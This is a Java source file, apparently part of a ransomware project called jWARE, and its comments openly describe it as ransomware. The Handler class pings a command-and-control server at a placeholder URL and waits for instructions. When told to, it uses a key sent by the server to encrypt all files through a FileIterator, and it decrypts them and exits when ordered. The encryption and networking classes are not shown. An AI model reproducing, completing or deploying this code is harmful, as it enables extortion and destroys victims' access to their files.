package jWARE;

import java.util.concurrent.TimeUnit;

public class Handler {
	private static String serverURL = "http://example.com"; // C&C Server URL
	private static int stopResponse = responseAction.STOP.ordinal(); // STOP Response (int)
	private static int decryptResponse = responseAction.DECRYPT.ordinal(); // DECRYPT Response (int)
	private static int encryptResponse = responseAction.ENCRYPT.ordinal(); // ENCRYPT Response (int)
	
	/* Handles initialization of ransomware, initially sends a "helloworld" message to get information for encryption, then sends nothing just gets updates from the server */
	public static void main(String[] args) throws Exception {
		Controller controller = new Controller(serverURL);
		String nextMessage = "helloworld";
		FileIterator it = new FileIterator();
		boolean firstRun = true;
		boolean stop = false;
		
		while(!stop) {
			String ping = controller.ping(nextMessage); // Tell the server that we are initiating the ransomware, the server will respond with instructions

			int statusCode = 0;
			
			if(ping.indexOf(':') != -1)
				statusCode = Integer.valueOf((ping.substring(0, ping.indexOf(':'))));
			else
				statusCode = Integer.valueOf(ping);
						
			if((statusCode == stopResponse) && firstRun) {
				stop = true;
				break;
			} else if(statusCode == encryptResponse) {
				String key = ping.substring(ping.indexOf(':') + 1);
				it.encryptAll(key);
				key = null;
				System.gc();
			} else if(statusCode == decryptResponse) {
				String key = ping.substring(ping.indexOf(':') + 1);
				it.decryptAll(key);
				key = null;
				System.gc();
				stop = true;
				break;
			} else {
				nextMessage = "";
				firstRun = false;
				TimeUnit.SECONDS.sleep(1);
				continue;
			}
			
			if(firstRun) {
				nextMessage = "";
				firstRun = false;
			}
			
			TimeUnit.SECONDS.sleep(1);
		}
	}

}
